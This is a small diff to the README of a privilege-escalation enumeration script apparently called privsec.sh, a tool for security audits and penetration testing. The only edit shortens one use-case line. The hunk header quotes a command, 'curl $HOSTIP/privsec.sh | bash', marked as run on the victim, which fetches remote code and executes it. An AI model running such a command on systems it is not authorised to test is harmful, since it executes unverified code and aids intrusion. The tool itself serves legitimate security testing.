@@ -106,7 +106,7 @@ curl $HOSTIP/privsec.sh | bash #Victim
 
 **Quick Security Audits** - Fast initial assessment of privilege escalation vectors  
 **Penetration Testing** - Identify low-hanging fruit before deeper enumeration  
-**Security Reporting** - Clean, professional output for documentation  
+**Security Reporting** - Clean output for documentation  
 **Learning** - Educational tool with clear, readable code  
 **CI/CD Integration** - Lightweight scanner for automated security checks  
 
